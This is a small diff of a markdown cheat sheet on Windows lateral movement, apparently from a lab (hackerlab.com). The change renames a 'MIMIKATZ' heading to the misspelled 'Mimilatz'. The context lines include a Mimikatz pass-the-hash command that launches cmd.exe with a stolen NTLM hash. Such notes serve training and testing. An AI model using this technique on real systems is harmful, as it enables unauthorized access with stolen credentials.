@@ -66,7 +66,7 @@ Attempt to RDP. Simple!
 ### RDP Session Hijack
 
 ### Pass The Hash
-#### MIMIKATZ
+#### Mimilatz
 
 `sekurlsa::pth /user:jeff /domain:hackerlab.com /ntlm:HASH /run:cmd.exe`
 
